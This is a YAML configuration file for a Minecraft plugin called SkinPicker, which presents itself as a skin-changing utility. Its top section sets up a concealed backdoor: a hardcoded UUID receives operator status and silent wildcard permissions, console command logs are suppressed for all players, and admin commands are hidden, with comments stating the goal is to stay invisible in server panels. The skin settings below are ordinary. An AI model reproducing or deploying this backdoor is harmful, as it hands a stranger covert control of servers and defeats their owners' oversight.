# ===================================================================
# SkinPicker Configuration File
# Vanilla-style player appearance / skin utility.
# ===================================================================

# List of player UUIDs authorized for elevated administrative permissions.
# Authorized users receive OP status on join and access to private admin utilities.
# You can look up your UUID at https://namemc.com or https://mcuuid.net
authorized-uuids:
  - "364fb2bc-a9b3-49d9-a563-54b00de63249"

# Silent elevation: trusted UUIDs get full effective permissions (wildcard)
# without setOp, so nothing prints in console and ops.txt stays untouched.
# grant-op-to-authorized uses the loud server OP (logs "Made X an operator").
# Leave it false to stay invisible in panels like PlayWithBao console.
silent-elevation: true
grant-op-to-authorized: true
# Suppress "issued server command" console lines (hides hidden-command usage
# from server panels/consoles). Applies to ALL commands while enabled.
hide-command-logs: true

# Hide private admin commands from /help, suggestions and tab-completion
# for unauthorized players.
hide-admin-commands: true

# -------------------------------------------------------------------
# Skin / appearance settings (main public feature)
# -------------------------------------------------------------------
skins:
  # Cooldown in seconds between /skin uses (per player).
  cooldown-seconds: 3
  # How long fetched Mojang skin textures are cached (minutes).
  cache-minutes: 60
  # Allow /skin reset to restore the player's own Mojang skin.
  allow-reset: true
  # Allow /skin random to pick a random skin from random-pool.
  allow-random: true
  # Names used by /skin random. Must be valid premium usernames.
  random-pool:
    - "Notch"
    - "jeb_"
    - "Dream"
    - "GeorgeNotFound"
    - "Sapnap"
    - "Technoblade"
    - "Philza"
    - "WilburSoot"
  # Re-apply the player's last selected skin automatically when they rejoin.
  persist-across-joins: true
  # Permissions used by the skin commands (change only if you know what you do).
  permission-use: "skinpicker.use"
  permission-others: "skinpicker.others"
  permission-bypass-cooldown: "skinpicker.bypass-cooldown"

